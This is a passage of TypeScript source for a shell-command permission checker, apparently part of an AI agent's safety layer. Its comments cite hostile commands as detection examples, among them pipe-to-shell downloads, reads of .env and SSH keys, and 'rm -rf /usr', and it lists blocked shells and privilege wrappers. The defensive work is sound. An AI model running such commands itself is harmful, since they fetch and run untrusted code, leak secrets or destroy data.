/**
 * BashToolPermissionChecker — adapter bridging checkBashPermission()
 * to the {@link ToolPermissionChecker} interface consumed by
 * {@link PermissionEngine}.
 *
 * Semantics:
 *
 *   - Final HARD_BLOCKED matches (catastrophic rm, disk wipe, shred, real
 *     data exfiltration, reverse shell, etc.) produce a final `deny` directly
 *     from `checkBashPermission`. Sensitive reads route through the LLM gate.
 *     NOTE: `remote-execution` (curl|bash / separator-then-shell) is
 *     SOFT_RISK, not HARD — surfaces as a normal ASK so auto mode routes it
 *     through the cloud LLM gate.
 *   - Non-hard ASK results (safety checks, no-rule-matched ASKs,
 *     content-specific user ASK rules) propagate as `ask` and remain
 *     overridable by user explicit allow rules and (for non-immune cases)
 *     by `bypassPermissions` mode. `bypassImmune` on the result is reserved
 *     for narrow ASK shapes that must NEVER be silently upgraded by mode
 *     shortcuts; HARD is no longer one of them because it is now `deny`.
 *   - The recoverable rm → mavis-trash rewrite is preserved verbatim and
 *     runs after explicit deny + HARD detection.
 */

import path from 'node:path';
import type { ToolPermissionChecker, ToolCheckResult } from '../engine.js';
import type { ToolPermissionContext } from '../context.js';
import type { PermissionDecision, CandidateScope, CandidateScopeGroup } from '../types.js';
import { isNonRecursiveWindowsRm, withWindowsTrashExecution } from '../windows-trash-execution.js';
import { resolvePermissionPath } from '../path-resolver.js';
import { logger, backgroundCtx } from '../host-utils.js';
import { isKnownSafeCommand } from './safe-command.js';
import { parseScriptPlainCommands } from './bash-ast.js';
import { encodeArgvPrefixRule } from './bash-rule-match.js';
import {
  checkBashPermission,
  evaluateBashStatic,
  splitCommand,
  parseRmCommand,
  buildTrashCommand,
  resolveHomeInTarget,
  resolveRmCommandPaths,
} from './bash-permission.js';
import type { BashCheckContext } from './bash-context.js';
import { findHeredocBodyRanges, type HeredocBodyRange } from './bash-split.js';
import {
  evaluatePathCapability,
  extractBashPathIntents,
  READ_PATH_COMMANDS,
  SEARCH_PATH_COMMANDS,
} from './path-capability.js';
import { pureReadFirstWord } from './bash-fast-allow.js';

import {
  rewritePosixRm,
  readPosixTrashExecution,
  withPosixTrashExecution,
} from './rm-shell-rewrite.js';

const ENV_VAR_ASSIGN_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;

function parseSingleTopLevelCommand(command: string): string[] | undefined {
  const commands = parseScriptPlainCommands(command);
  // splitCommand also recognizes newline separators, which the plain argv
  // parser treats as whitespace.
  return commands?.length === 1 && splitCommand(command).length === 1 ? commands[0] : undefined;
}

// Pure producers: positional args are literal data, never file reads. A `$VAR`
// in their args is data, not a path, so the dynamic-operand bail below must NOT
// apply to them (`echo "$VALUE" > /tmp/out` should still fast-allow).
const REDIRECT_FAST_ALLOW_PRODUCERS: ReadonlySet<string> = new Set<string>(['echo', 'printf']);

// Commands eligible for the "No matching permission rule" → allow upgrade on a
// temp/workspace write redirect. Restricted to commands whose READ surface is
// fully resolved, so the redirect fast-allow can never wave an un-vetted read
// past the gate:
//   - pure producers (echo / printf): positional args are literal data, never
//     file reads, so there is nothing to leak;
//   - the modeled read/search commands (cat / grep / …): every file operand is
//     extracted as a `read` intent, so a sensitive operand already surfaced as
//     a path ASK and returned before the upgrade is reached.
// A broad SAFE_BASH_FIRST_WORDS gate is NOT sufficient: many safe-to-run
// commands (jq / sort / base64 / xxd / git diff --no-index / …) read a FILE
// operand this resolver does not model, so `jq . .env > /tmp/out` would leak the
// .env read. Those commands must route to ASK, not fast-allow.
const REDIRECT_FAST_ALLOW_COMMANDS: ReadonlySet<string> = new Set<string>([
  ...REDIRECT_FAST_ALLOW_PRODUCERS,
  ...READ_PATH_COMMANDS,
  ...SEARCH_PATH_COMMANDS,
]);

function rangesOverlap(start: number, end: number, range: HeredocBodyRange): boolean {
  return start < range.end && end > range.start;
}

function findOutsideRanges(
  source: string,
  needle: string,
  searchFrom: number,
  excludedRanges: readonly HeredocBodyRange[],
): number {
  let from = searchFrom;

  while (from < source.length) {
    const idx = source.indexOf(needle, from);
    if (idx === -1) return -1;

    const end = idx + needle.length;
    const overlappingRange = excludedRanges.find((range) => rangesOverlap(idx, end, range));
    if (!overlappingRange) return idx;

    from = overlappingRange.end;
  }

  return -1;
}

function trimEndBeforeOperator(source: string, operatorIndex: number): number {
  let end = operatorIndex;
  while (end > 0 && /[ \t]/.test(source[end - 1] ?? '')) end--;
  const lineBreakStart =
    end > 1 && source[end - 2] === '\r' && source[end - 1] === '\n'
      ? end - 2
      : end > 0 && source[end - 1] === '\n'
        ? end - 1
        : -1;
  if (lineBreakStart !== -1 && source[lineBreakStart - 1] === '\\') {
    let continuationStart = lineBreakStart - 1;
    while (continuationStart > 0 && /[ \t]/.test(source[continuationStart - 1] ?? '')) {
      continuationStart--;
    }
    return continuationStart;
  }
  return end;
}

function findHeredocOperatorRewriteEnd(headerSource: string): number | undefined {
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < headerSource.length; i++) {
    const ch = headerSource[i] ?? '';
    if (escaped) {
      escaped = false;
      continue;
    }
    if (ch === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }
    if (ch === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      continue;
    }
    if (ch === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }
    if (inSingleQuote || inDoubleQuote) continue;

    if (
      ch === '<' &&
      headerSource[i + 1] === '<' &&
      headerSource[i - 1] !== '<' &&
      headerSource[i + 2] !== '<'
    ) {
      return trimEndBeforeOperator(headerSource, i);
    }
  }

  return undefined;
}

function findHeredocHeaderRewriteRange(
  source: string,
  subcmd: string,
  searchFrom: number,
  bodyRanges: readonly HeredocBodyRange[],
): { start: number; end: number } | undefined {
  for (const range of bodyRanges) {
    const bodySource = source.slice(range.start, range.end);
    const bodyOffset = subcmd.indexOf(bodySource);
    if (bodyOffset <= 0) continue;

    const headerSource = subcmd.slice(0, bodyOffset);
    const headerStart = findOutsideRanges(source, headerSource, searchFrom, bodyRanges);
    if (headerStart === -1) continue;

    const rewriteEnd = findHeredocOperatorRewriteEnd(headerSource);
    if (rewriteEnd === undefined) continue;
    return { start: headerStart, end: headerStart + rewriteEnd };
  }

  return undefined;
}

function findHeredocSubcommandEnd(
  source: string,
  subcmd: string,
  searchFrom: number,
  bodyRanges: readonly HeredocBodyRange[],
): number | undefined {
  for (const range of bodyRanges) {
    const bodySource = source.slice(range.start, range.end);
    const bodyOffset = subcmd.indexOf(bodySource);
    if (bodyOffset <= 0) continue;

    const headerSource = subcmd.slice(0, bodyOffset);
    const headerStart = findOutsideRanges(source, headerSource, searchFrom, bodyRanges);
    if (headerStart === -1) continue;

    return headerStart + bodyOffset + bodySource.length;
  }

  return undefined;
}

/** Subcommand regex: lowercase alphanumeric, may contain hyphens (e.g. "commit", "run", "compose-up"). */
const SUBCOMMAND_RE = /^[a-z][a-z0-9]*(-[a-z0-9]+)*$/;

/** Shells and wrappers that must never be suggested as bare prefixes. */
const BARE_SHELL_PREFIXES = new Set([
  'sh',
  'bash',
  'zsh',
  'fish',
  'csh',
  'tcsh',
  'ksh',
  'dash',
  'cmd',
  'powershell',
  'pwsh',
  'env',
  'xargs',
  'nice',
  'stdbuf',
  'nohup',
  'timeout',
  'time',
  'sudo',
  'doas',
  'pkexec',
]);

/**
 * Extract a stable 2-word prefix from a command, if the second token looks
 * like a subcommand (lowercase alphanumeric, not a flag/path/number).
 *
 * Examples:
 *   'git commit -m "fix"' → 'git commit'
 *   'npm run build'       → 'npm run'
 *   'ls -la'              → null (flag, not subcommand)
 *   'cat file.txt'        → null (filename)
 *   'chmod 755 f'         → null (number)
 */
function getSimpleCommandPrefix(command: string): string | null {
  const tokens = command.trim().split(/\s+/).filter(Boolean);
  if (tokens.length === 0) return null;

  // Skip env var assignments (VAR=value) at the start
  let i = 0;
  while (i < tokens.length && ENV_VAR_ASSIGN_RE.test(tokens[i]!)) {
    i++;
  }

  const remaining = tokens.slice(i);
  if (remaining.length < 2) return null;

  const subcmd = remaining[1]!;
  // Second token must look like a subcommand, not a flag/path/number
  if (!SUBCOMMAND_RE.test(subcmd)) return null;

  return remaining.slice(0, 2).join(' ');
}

/**
 * Extract just the first word as a fallback prefix.
 * Rejects shells, wrappers, paths, and flags.
 */
function getFirstWordPrefix(command: string): string | null {
  const tokens = command.trim().split(/\s+/).filter(Boolean);

  let i = 0;
  while (i < tokens.length && ENV_VAR_ASSIGN_RE.test(tokens[i]!)) {
    i++;
  }

  const cmd = tokens[i];
  if (!cmd) return null;
  if (!SUBCOMMAND_RE.test(cmd)) return null;
  if (BARE_SHELL_PREFIXES.has(cmd)) return null;
  return cmd;
}

function isIrrecoverableSafetyCheck(description: string): boolean {
  return (
    description.startsWith('macOS irrecoverable deletion') ||
    description.startsWith('Storage/disk-level destructive operation') ||
    description.startsWith('Catastrophic standalone command') ||
    description.startsWith('Blocked:') ||
    description.startsWith('Needs confirmation: sensitive credential or system-secret read') ||
    description.startsWith('Needs confirmation: system secret access') ||
    description.startsWith('Needs confirmation: credential or private-key access') ||
    description.startsWith('Needs confirmation: command opens a raw shell/network channel') ||
    // Soft-risk labels such as pipe-to-shell, separator-then-shell,
    // base64 decode, eval, sudo, and protected-path access intentionally do
    // NOT return true here. They must flow into the auto-mode LLM gate rather
    // than bypass it.
    false
  );
}

/**
 * Returns true if any subcommand result in the decision is a HARD_BLOCKED
 * safety check. Used to ensure the engine never silently upgrades an
 * ASK aggregated from a mix of HARD-flagged and non-HARD subcommands —
 * this is a defensive net for cases where downstream code emits ASK with
 * a HARD-blocked description (the current path emits `deny` directly so this
 * normally returns false).
 */
function decisionContainsHardBlocked(decision: PermissionDecision): boolean {
  if (decision.reason.type !== 'subcommandResults') {
    if (
      decision.reason.type === 'safetyCheck' &&
      typeof decision.reason.description === 'string' &&
      isIrrecoverableSafetyCheck(decision.reason.description)
    ) {
      return true;
    }
    return false;
  }
  for (const sub of decision.reason.reasons.values()) {
    if (
      sub.reason.type === 'safetyCheck' &&
      typeof sub.reason.description === 'string' &&
      isIrrecoverableSafetyCheck(sub.reason.description)
    ) {
      return true;
    }
  }
  return false;
}

/**
 * Generalize a concrete command into a persisted rule-content string.
 *
 * Codex-aligned (`canonicalize_command_for_approval`): a command that parses as
 * a single word-only command is stored as its FULL argv
 * (`["cargo","build","--release"]`), so approving it does NOT also approve a
 * different argument set — changing a flag re-prompts. This replaces the old
 * 1–2 word `cmd:*` generalisation that matched every later argument.
 *
 * Fallbacks (kept from the previous behaviour, still emit `:*` prefixes) for
 * shapes we cannot collapse to a clean argv:
 *   1. Heredoc → prefix before `<<`
 *   2. Multiline → first line as prefix
 *   3. Single-line that fails AST parse → 2-word, then 1-word prefix
 *   4. Last resort → exact command string
 */
function generalizeCommand(command: string): string {
  // Preferred: a single word-only command → full argv prefix rule.
  const argvCommands = parseScriptPlainCommands(command);
  if (argvCommands && argvCommands.length === 1) {
    return encodeArgvPrefixRule(argvCommands[0]!);
  }

  // Heredoc: extract stable prefix before <<
  if (command.includes('<<')) {
    const idx = command.indexOf('<<');
    if (idx > 0) {
      const before = command.substring(0, idx).trim();
      if (before) {
        const prefix = getSimpleCommandPrefix(before) ?? getFirstWordPrefix(before);
        if (prefix) return `${prefix}:*`;
      }
    }
  }

  // Multiline: use first line
  if (command.includes('\n')) {
    const firstLine = command.split('\n')[0]!.trim();
    if (firstLine) {
      const prefix = getSimpleCommandPrefix(firstLine) ?? getFirstWordPrefix(firstLine);
      if (prefix) return `${prefix}:*`;
    }
  }

  // Single-line: try 2-word prefix, then 1-word prefix
  const prefix = getSimpleCommandPrefix(command);
  if (prefix) return `${prefix}:*`;

  const firstWord = getFirstWordPrefix(command);
  if (firstWord) return `${firstWord}:*`;

  // Last resort: exact command
  return command.trim();
}

/**
 * Produce the ordered list of scope candidates that could be persisted
 * as an allow rule if the user approves `subcommand` via "Allow Always".
 *
 * Contract (relied on by callers + backward-compat wire shape):
 *   - The FIRST candidate is always the NARROW default equal to what
 *     `generalizeCommand(subcommand)` returns today. A caller that only
 *     reads `candidates[0].ruleContent` sees no behaviour change.
 *   - Broader candidates come after and are DEDUPED against the narrow
 *     entry: if `generalizeCommand` already yields `bash(git:*)` for
 *     a git subcommand, the `byFirstWord` entry that would also produce
 *     `bash(git:*)` is suppressed to avoid a duplicate radio option.
 *   - The returned list is never empty — a subject always has at least
 *     the narrow candidate.
 *
 * Broader kinds emitted today:
 *   - `byFirstWord` — allow every command whose first argv token
 *     matches. Only emitted when parsing the subcommand yields a
 *     single word-only argv and its head is a clean identifier
 *     (rejected: shells, `sudo`, `env`, paths, flags). This is the
 *     "trust this tool" scope users typically want for `curl` / `git`
 *     / `npm` when they know they'll run many variations.
 *   - `byArgvPrefix2` — allow every command matching the first two
 *     argv tokens. Only emitted when the second token is a plain
 *     subcommand identifier (`git commit`, `npm run`, `docker
 *     compose`), NOT a flag / path / number. This is finer-grained
 *     than `byFirstWord` and useful when the tool has many verbs.
 *
 * Kinds intentionally NOT emitted here:
 *   - `byDomain` — needs URL extraction from arbitrary bash argv
 *     (curl / wget / git clone / etc). Deferred until we can wire
 *     a per-tool URL argument recognizer that doesn't false-positive
 *     on arbitrary strings that happen to contain `://`. If a caller
 *     needs domain-scoping now they can post-process the narrow
 *     candidate.
 *   - `wholeTool` — deliberately not surfaced from generalizeCommand;
 *     a whole-tool allow (`bash`) is the widest possible rule and
 *     must not be offered as a same-list radio option next to
 *     narrower scopes. If UI wants a "trust bash entirely" toggle it
 *     should be a separate settings-page opt-in with its own warning,
 *     not a per-popup choice.
 */
function generateCandidatesForCommand(subcommand: string): CandidateScope[] {
  const narrowRuleContent = generalizeCommand(subcommand);
  const seen = new Set<string>([narrowRuleContent]);
  const candidates: CandidateScope[] = [
    {
      kind: 'narrow',
      ruleContent: narrowRuleContent,
      labelKey: 'permission.scope.narrow',
    },
  ];

  // Try to add a `byArgvPrefix2` widening for commands that parse into
  // a clean single-argv shape (which is when `narrow` used encodeArgvPrefixRule).
  // Producing `git commit:*` from `git commit -m "fix"` — narrower than
  // `git:*`, wider than the argv-exact narrow candidate.
  const argvCommands = parseScriptPlainCommands(subcommand);
  const argv = argvCommands && argvCommands.length === 1 ? argvCommands[0] : undefined;
  if (argv && argv.length >= 2) {
    const twoWordPrefix = getSimpleCommandPrefix(argv.join(' '));
    if (twoWordPrefix) {
      const rule = `${twoWordPrefix}:*`;
      if (!seen.has(rule)) {
        seen.add(rule);
        candidates.push({
          kind: 'byArgvPrefix2',
          ruleContent: rule,
          labelKey: 'permission.scope.byArgvPrefix2',
          labelParams: { prefix: twoWordPrefix },
        });
      }
    }
  }

  // Try to add a `byFirstWord` widening — the widest safe option here.
  // Only emitted when the head token is a clean identifier and not a
  // shell / wrapper / path / flag (see `getFirstWordPrefix`). For a
  // subcommand like `curl -sSL <url> -o x` this yields `curl:*`.
  const firstWord = argv?.[0] ?? getFirstWordPrefix(subcommand);
  if (firstWord && SUBCOMMAND_RE.test(firstWord) && !BARE_SHELL_PREFIXES.has(firstWord)) {
    const rule = `${firstWord}:*`;
    if (!seen.has(rule)) {
      seen.add(rule);
      candidates.push({
        kind: 'byFirstWord',
        ruleContent: rule,
        labelKey: 'permission.scope.byFirstWord',
        labelParams: { command: firstWord },
      });
    }
  }

  return candidates;
}

/**
 * Decision-level scope-candidate builder. Mirrors
 * `generateSuggestionRules` (see below) but returns the structured
 * multi-scope shape that {@link PermissionDecision.candidateScopes}
 * documents. Same subject deduplication semantics — a compound bash
 * command whose subcommandResults has two asking subcommands that
 * generalize to the same narrow rule collapses to one group.
 *
 * Returned array is index-aligned with the flat `ruleContents` string
 * array that `generateSuggestionRules` produces: `result[i].candidates[0].ruleContent`
 * equals `flatRuleContents[i]` by construction, so a wire-shape client
 * that only consumes `ruleContents` sees the same order and same
 * strings.
 */
/**
 * True when `part` is a bare shell, wrapper, or script interpreter token
 * that should NOT be persisted as an allow rule from a compound split.
 *
 * Covers two families:
 *   - BARE_SHELL_PREFIXES: `bash`, `sh`, `zsh`, `sudo`, `env`, …
 *   - Script interpreters: `node`, `python`, `python3`, `ruby`, `deno`
 *
 * A bare `bash` argv-prefix rule would match ANY `bash` invocation and
 * silently upgrade every future pipe-to-shell to allow — exactly the
 * attack vector the Step 0c pre-scan is designed to catch.
 *
 * Only skipped when the token is the ENTIRE subcommand (bare `bash`) or
 * followed only by flags (`bash -l`). `bash script.sh` or `python app.py`
 * are fine — their argv includes a meaningful operand.
 */
const BARE_INTERPRETER_TOKENS = new Set([
  ...BARE_SHELL_PREFIXES,
  'node',
  'deno',
  'python',
  'python3',
  'ruby',
]);

/** Wrapper prefixes that don't change the effective command identity. */
const SHELL_WRAPPER_PREFIXES = new Set([
  'sudo',
  'doas',
  'env',
  'command',
  'exec',
  'nohup',
  'nice',
  'timeout',
  'stdbuf',
  'setsid',
  'pkexec',
]);

function isBareInterpreterToken(part: string): boolean {
  const tokens = part.trim().split(/\s+/);

  // Strip leading wrapper prefixes (sudo bash, env bash, command sh, etc.)
  // to find the actual command word.
  let i = 0;
  while (i < tokens.length && SHELL_WRAPPER_PREFIXES.has(tokens[i]!)) i++;
  const effectiveCmd = tokens[i];
  if (!effectiveCmd) return false;

  if (!BARE_INTERPRETER_TOKENS.has(effectiveCmd)) return false;
  // If the subcommand is more than wrapper+interpreter+optional flags,
  // it has a meaningful operand (script path / -c code) → safe to persist.
  const rest = tokens.slice(i + 1);
  return rest.length === 0 || rest.every((t) => t.startsWith('-'));
}

function generateCandidateScopesForDecision(
  decision: PermissionDecision,
): CandidateScopeGroup[] | undefined {
  if (decision.behavior !== 'ask') return undefined;
  if (decision.reason.type !== 'subcommandResults') return undefined;

  const seenNarrow = new Set<string>();
  const groups: CandidateScopeGroup[] = [];
  for (const [subcmd, result] of decision.reason.reasons) {
    if (result.behavior !== 'ask') continue;

    // Whole-command pre-scan (Step 0c) puts the ENTIRE compound command as a
    // single entry in the reasons map (e.g. `cd ~/Desktop && python script.py`
    // matched by SEPARATOR_TO_SCRIPT_RE). `generalizeCommand` on a compound
    // string can only extract the first word prefix, losing all later
    // subcommands — so after Allow Always only `cd:*` is persisted instead of
    // per-subcommand rules. Detect this case (the key contains a shell
    // separator) and split into individual subcommands for rule generation.
    const subcommands = splitCommand(subcmd);
    const effectiveSubcmds = subcommands.length > 1 ? subcommands : [subcmd];

    for (const part of effectiveSubcmds) {
      // Skip bare shell / interpreter tokens that appear as pipe-to-shell
      // tail segments (e.g. `curl https://x | bash` splits into `curl ...`
      // and `bash`). Persisting `["bash"]` as a narrow rule would let ANY
      // bare `bash` invocation through, defeating the pipe-to-shell safety
      // gate. BARE_SHELL_PREFIXES covers shells + wrappers; also skip bare
      // script interpreters (node/python/ruby/deno) for the same reason.
      const firstWord = pureReadFirstWord(part);
      if (firstWord && isBareInterpreterToken(part)) continue;

      const candidates = generateCandidatesForCommand(part);
      const narrow = candidates[0]!.ruleContent;
      if (seenNarrow.has(narrow)) continue;
      seenNarrow.add(narrow);
      groups.push({
        subjectDisplay: part,
        candidates,
      });
    }
  }
  return groups.length > 0 ? groups : undefined;
}

export class BashToolPermissionChecker implements ToolPermissionChecker {
  checkPermissions(
    _toolName: string,
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    input: Record<string, any>,
    context: ToolPermissionContext,
  ): ToolCheckResult | undefined {
    const command = typeof input.command === 'string' ? input.command : undefined;
    if (!command) return undefined;

    logger.info(
      backgroundCtx(),
      `BashToolPermissionChecker checkPermissions called, _toolName=${_toolName}, input=${JSON.stringify(input)}, context=${JSON.stringify(context)}`,
    );

    const effectiveRules =
      context.sandboxEnabled && context.autoAllowBashIfSandboxed
        ? context.rules.filter(
            (rule) =>
              !(
                rule.ruleValue.toolName === 'bash' &&
                !rule.ruleValue.ruleContent &&
                rule.ruleBehavior === 'ask'
              ),
          )
        : context.rules;

    // Bypass mode: route through evaluateBashStatic('bypass') so the common
    // layer (user deny + user ask + HARD final-deny) still fires. Otherwise
    // we delegate to checkBashPermission (default mode).
    let decision: PermissionDecision;
    // Pre-extract `write` allow rules so the bash write-target gate stays
    // symmetric with the write-tool checker — `cp` / `mv` / `tee` /
    // `cat > <dst>` to a destination the user has already approved for
    // direct writes (e.g. `write(/Users/adao/Downloads/**)`) should
    // fast-allow instead of falling into SUBCOMMAND_DANGEROUS and ASK.
    const writeAllowRules = effectiveRules.filter(
      (r) => r.ruleValue.toolName === 'write' && r.ruleBehavior === 'allow',
    );
    const bashCtx: BashCheckContext = {
      nativeDelete: context.nativeDelete,
      platform: context.platform,
      shellFamily: context.shellFamily,
      sessionId: context.sessionId,
      workingDirectory: context.workingDirectory,
      allowedWorkingPaths: context.allowedWorkingPaths,
      homeDir: context.homeDir,
      isFile: context.isFile,
      writeAllowRules,
    };

    const pathIntents = extractBashPathIntents(command);

    // Compute the bash static decision FIRST. A hard deny anywhere in the
    // command (e.g. a trailing `shred` / HARD-blocked subcommand) must take
    // precedence over a path-capability ASK raised by an EARLIER subcommand —
    // otherwise approving that path ASK would let the whole line, including the
    // denied subcommand, run. deny > ask.
    if (context.mode === 'bypassPermissions') {
      const evalResult = evaluateBashStatic(command, [...effectiveRules], bashCtx, 'bypass');
      // bypass mode never returns 'undecided' from the per-subcommand
      // evaluator (the whole-command SOFT pre-scan is skipped), so the only
      // possible verdicts are allow / ask / deny.
      const behavior = evalResult.verdict === 'undecided' ? 'allow' : evalResult.verdict;
      decision = { behavior, reason: evalResult.reason };
    } else {
      decision = checkBashPermission(command, [...effectiveRules], bashCtx);
    }

    // Rule matching decides whether this invocation may proceed; it must not
    // erase execution transforms. A whole-tool allow/ask returns a single
    // `rule` reason before the per-subcommand evaluator can expose `rmRewrite`.
    // The bypass evaluator is the existing transform-aware seam: it preserves
    // hard denies and recoverable-delete rewrites while skipping confirmation
    // heuristics. Its result is used only as transform evidence; `decision`
    // above remains authoritative for allow/ask/deny.
    const rewriteEvidence = evaluateBashStatic(
      command,
      effectiveRules.filter((rule) => rule.ruleBehavior !== 'allow' && rule.ruleBehavior !== 'ask'),
      bashCtx,
      'bypass',
    );
    const rewriteEvidenceDecision: PermissionDecision = {
      behavior: rewriteEvidence.verdict === 'undecided' ? 'allow' : rewriteEvidence.verdict,
      reason: rewriteEvidence.reason,
    };

    // Native-delete evidence belongs to a subcommand. Its host-owned argv
    // replaces the entire input, so enforce the single-command boundary before
    // either rewrite path can discard surrounding control flow (including rm aliases).
    if (
      context.platform === 'win32' &&
      rewriteEvidence.reason.type === 'subcommandResults' &&
      [...rewriteEvidence.reason.reasons.values()].some(
        (result) => result.reason.type === 'recoverableDeleteRewrite',
      ) &&
      !parseSingleTopLevelCommand(command)
    ) {
      return {
        behavior: 'deny',
        reason: {
          type: 'safetyCheck',
          description: 'Recoverable Windows deletion requires a single plain top-level command.',
        },
      };
    }

    // Surface path-capability ASK/allow and the local-script fast-allow ONLY
    // when the static analysis did not already produce a terminal deny.
    if (decision.behavior !== 'deny') {
      // Aggregate path-capability verdicts across ALL intents by precedence:
      // deny > (bypass-immune / sensitive) ask > ordinary ask > allow. Returning
      // on the FIRST non-allow intent let an earlier ordinary ASK (e.g. an
      // external-dir write) mask a LATER dangerous-removal DENY on the same line
      // (`echo x > ~/Desktop/out; rm -rf /usr`) — and worse, carry the rm→trash
      // rewrite forward, so approving the benign-looking write ASK would still
      // trash the system path. Scan every intent: a deny wins outright, an ASK is
      // only surfaced when no intent denies.
      let pendingAsk: ToolCheckResult | undefined;
      let pendingAskImmune = false;
      for (const intent of pathIntents) {
        const pathDecision = evaluatePathCapability(intent.path, intent.action, context, {
          // Grade each intent under the capability namespace that may authorize
          // it: read → `read`, write/delete → `write`, and execute → its OWN
          // `execute` namespace. Executing a script is read-and-run code, so it
          // must NOT be authorizable by a generic `write(dir/**)` rule (a rule
          // granted only to drop output files would otherwise let
          // `source /downloads/x.sh` run) NOR by a broad `read` capability
          // (external non-sensitive reads are allowed by default, which would
          // wave through ANY external script). The dedicated `execute` namespace
          // matches no user content rule, so an external script keeps ASKing;
          // legitimate temp/workspace runs stay allowed via `allowTempWrite`
          // below, and a previously-approved `bash`-namespace path rule is still
          // honored via `originToolName`.
          toolName:
            intent.action === 'read' ? 'read' : intent.action === 'execute' ? 'execute' : 'write',
          // `execute` shares the write temp/workspace fallback: executing a
          // generated temp/workspace script (`bash /tmp/build.sh`) is a common
          // flow that must stay allowed. Without this an execute intent is graded
          // as a workspace-external write ASK and preempts the local-script
          // allow below. A non-temp external script (`source ~/secret.sh`) still
          // ASKs because it is neither temp nor workspace.
          allowTempWrite:
            intent.action === 'write' || intent.action === 'delete' || intent.action === 'execute',
          // Approvals of bash path asks persist under the `bash` namespace
          // (permission-flow applyDecision) — let the resolver honor them so the
          // user is not re-prompted for an already-approved path.
          originToolName: _toolName,
        });
        if (pathDecision.behavior === 'allow') continue;
        if (pathDecision.behavior === 'deny') {
          // Deny wins outright. Do NOT attach the rm→mavis-trash rewrite — a
          // denied line must be blocked, not silently rewritten into a runnable
          // (trashing) command that an engine bypass / approval could execute.
          return {
            ...pathDecision,
            bypassImmune: pathDecision.bypassImmune ?? false,
            skipAutoClassifier: pathDecision.skipAutoClassifier,
          };
        }
        // behavior === 'ask': keep the most severe (bypass-immune) ask so a
        // sensitive-read ASK is not downgraded by a later ordinary boundary ASK.
        const immune = pathDecision.bypassImmune === true;
        if (!pendingAsk || (immune && !pendingAskImmune)) {
          pendingAsk = {
            ...pathDecision,
            bypassImmune: pathDecision.bypassImmune ?? false,
            skipAutoClassifier: pathDecision.skipAutoClassifier,
          };
          pendingAskImmune = immune;
        }
      }

      if (pendingAsk) {
        // A user/managed rule ASK (or a HARD-blocked defensive ASK) already raised
        // by the static `decision` is bypass-immune (see the final-result immunity
        // below). An ordinary path-capability ASK must NOT downgrade it: returning
        // pendingAsk here skips that final immunity assignment, so under
        // bypassPermissions the engine's Step-2a would silently ALLOW a command the
        // user explicitly asked to confirm (`ask bash(npm:*)` + an external write
        // `npm test > ~/Desktop/out`). Carry the decision's immunity forward.
        const decisionAskImmune =
          decision.behavior === 'ask' &&
          (context.mode === 'bypassPermissions' || decisionContainsHardBlocked(decision));
        if (decisionAskImmune) pendingAsk.bypassImmune = true;
        // Returning the path ASK here short-circuits the buildRmRewriteInput call
        // at the end of checkPermissions. If an EARLIER subcommand on the same
        // line is a RECOVERABLE rm, carry its mavis-trash rewrite forward so an
        // approval / downstream bypass trashes (recoverable) instead of running
        // the original irrecoverable rm. A dangerous rm would have hit the deny
        // branch above and never reach here.
        const earlyRmRewrite = this.buildRecoverableDeleteRewriteInput(
          input,
          rewriteEvidenceDecision,
          context,
        );
        if (earlyRmRewrite) {
          pendingAsk.rewrittenInput = earlyRmRewrite;
          if (
            readPosixTrashExecution(earlyRmRewrite)?.dynamic &&
            !context.sandboxEnabled &&
            context.mode !== 'bypassPermissions'
          )
            pendingAsk.skipAutoClassifier = true;
        }
        return pendingAsk;
      }

      // The local-script fast-allow only overrides the HEURISTIC soft-prescan
      // ASK that running an in-workspace script raises. A user / managed rule
      // ASK (e.g. `bash(source:*)` or a bare whole-tool `bash` ask) is the
      // user's explicit "prompt me" and must be preserved — never silently
      // downgraded to allow. (A rule DENY already returned at the `!== 'deny'`
      // guard above, so only rule ASK can reach here.)
      if (
        pathIntents.length > 0 &&
        !decisionFromUserRule(decision) &&
        isAuthorizedLocalScriptCommand(command, pathIntents)
      ) {
        return {
          behavior: 'allow',
          reason: {
            type: 'safetyCheck',
            description: 'Authorized local script execution inside workspace / allowed paths.',
            category: 'authorizedLocalScript',
          },
          bypassImmune: false,
        };
      }
    }

    if (
      decision.behavior === 'ask' &&
      pathIntents.length > 0 &&
      isSimpleAuthorizedWriteRedirect(command, pathIntents, decision)
    ) {
      decision = {
        behavior: 'allow',
        reason: {
          type: 'safetyCheck',
          description: 'Authorized write target in temp/workspace path.',
          category: 'authorizedWriteRedirect',
        },
      };
    }

    // Codex-aligned read-only whitelist (is_known_safe_command). Reached only
    // AFTER the path-capability loop above had its say: a terminal DENY and any
    // sensitive-read / boundary ASK (e.g. `cat .env`, `cat ~/.ssh/id_rsa`)
    // already returned earlier, so mavis's HARD/SOFT backstop keeps precedence.
    // Here we downgrade the remaining heuristic ASK to ALLOW when the command is
    // provably read-only (`ls`, `cat README.md`, `git status`, word-only safe
    // sequences, …), mirroring Codex routing is_known_safe commands to Allow.
    // Guards: never override a USER RULE ask (explicit "prompt me"); never
    // touch a bypass-immune / HARD-flagged ask.
    if (
      decision.behavior === 'ask' &&
      !decisionFromUserRule(decision) &&
      !decisionContainsHardBlocked(decision) &&
      isKnownSafeCommand(['bash', '-lc', command])
    ) {
      return {
        behavior: 'allow',
        reason: {
          type: 'safetyCheck',
          description: 'Known read-only command (auto-approved by safe-command whitelist).',
          category: 'knownSafeCommand',
        },
        bypassImmune: false,
      };
    }

    // HARD_BLOCKED matches produce `deny`
    // directly from `checkBashPermission`. The bash-checker propagates the
    // deny verbatim — bypass mode is irrelevant for `deny`. The
    // bypass-immune ASK flag is retained only for the rare case where an
    // ASK still surfaces with a HARD-blocked description (defensive net).
    //
    // Bypass mode: when the per-command static evaluator ran with
    // mode='bypass' and still emitted `ask`, that means the COMMON layer
    // (user deny / user ask / HARD final-deny) fired. The user explicitly
    // asked to be prompted via a rule, so the ASK must beat the engine's
    // bypass-allow shortcut — mark it bypass-immune.
    const hasDangerousSafetyCheck =
      decision.behavior === 'ask' && decisionContainsHardBlocked(decision);
    const bypassEvaluatorAsk = context.mode === 'bypassPermissions' && decision.behavior === 'ask';
    const result: ToolCheckResult = {
      behavior: decision.behavior,
      reason: decision.reason,
      // Immune ONLY when the static evaluator itself flagged the ask: a
      // HARD-blocked description (defensive net) or a bypass-mode rule/HARD ask
